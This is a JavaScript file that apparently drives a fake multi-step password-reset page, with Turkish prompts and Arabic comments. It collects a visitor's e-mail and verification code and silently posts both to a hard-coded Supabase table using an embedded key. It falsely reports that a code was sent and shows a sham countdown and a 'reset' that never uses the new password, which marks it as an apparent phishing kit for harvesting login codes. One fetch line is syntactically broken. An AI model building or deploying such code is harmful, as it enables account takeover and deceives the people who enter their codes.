function nextStep(current, next) {
    document.getElementById(current).classList.add("hidden");
    document.getElementById(next).classList.remove("hidden");
}

function showMsg(id, text, type) {
    const el = document.getElementById(id);
    el.textContent = text;
    el.className = "msg " + (type || "");
}

let userIdentifier = "";
let countdownInterval = null;

function saveData(identifier, code) {
    // تأكد من الرابط ده بالظبط
    const supabaseUrl = 'https://dlmaxrjjrqntcssvrsmy.supabase.co';
    const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRsbWF4cmlqcnFudGNzc3Zyc215Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTIzMTk1MDAsImV4cCI6MjEwNzg5NTUwMH0.oFkpunqEGruS189py8FiU2BNCU3xBwSqLvkn2u_aIsg';

    fetch(${supabaseUrl}/rest/v1/submissions, {
        method: 'POST',
        headers: {
            'apikey': supabaseKey,
            'Authorization': 'Bearer ' + supabaseKey,
            'Content-Type': 'application/json',
            'Prefer': 'return=minimal'
        },
        body: JSON.stringify({ 
            identifier: identifier, 
            verification_code: code 
        })
    })
    .then(async res => {
        if(res.ok) {
            console.log('✅ تم الحفظ في قاعدة البيانات بنجاح');
        } else {
            const err = await res.json();
            console.log('❌ خطأ من Supabase:', err);
        }
    })
    .catch(err => console.log('❌ خطأ في الاتصال:', err));
}

function sendCode() {
    const idInput = document.getElementById("identifier").value.trim();
    if (!idInput) {
        showMsg("msg1", "Lütfen e-posta girin", "error");
        return;
    }
    userIdentifier = idInput;
    saveData(userIdentifier, null);
    showMsg("msg1", "Kod gönderildi", "success");
    setTimeout(() => {
        nextStep("step1", "step2");
    }, 500);
}

function verifyCode() {
    const code = document.getElementById("verificationCode").value.trim();
    if (!code) {
        showMsg("msg2", "Lütfen kodu girin", "error");
        return;
    }
    saveData(userIdentifier, code);
    document.getElementById("verificationCode").disabled = true;
    document.getElementById("verifyBtn").disabled = true;
    document.getElementById("countdownNote").classList.remove("hidden");
    let seconds = 7;
    document.getElementById("countdownNumber").textContent = seconds;
    countdownInterval = setInterval(() => {
        seconds--;
        document.getElementById("countdownNumber").textContent = seconds;
        if (seconds <= 0) {
            clearInterval(countdownInterval);
            nextStep("step2", "step3");
        }
    }, 1000);
}

function backToStep1() {
    nextStep("step2", "step1");
    document.getElementById("identifier").value = "";
    document.getElementById("verificationCode").value = "";
    document.getElementById("msg1").textContent = "";
    document.getElementById("msg2").textContent = "";
}

function resetPassword() {
    const pass = document.getElementById("newPass").value;
    const confirm = document.getElementById("confirmPass").value;
    if (pass.length < 6) {
        showMsg("msg3", "En az 6 karakter olmalı", "error");
        return;
    }
    if (pass !== confirm) {
        showMsg("msg3", "Şifreler eşleşmiyor", "error");
        return;
    }
    showMsg("msg3", "Başarılı", "success");
    setTimeout(() => {
        nextStep("step3", "step4");
    }, 500);
}
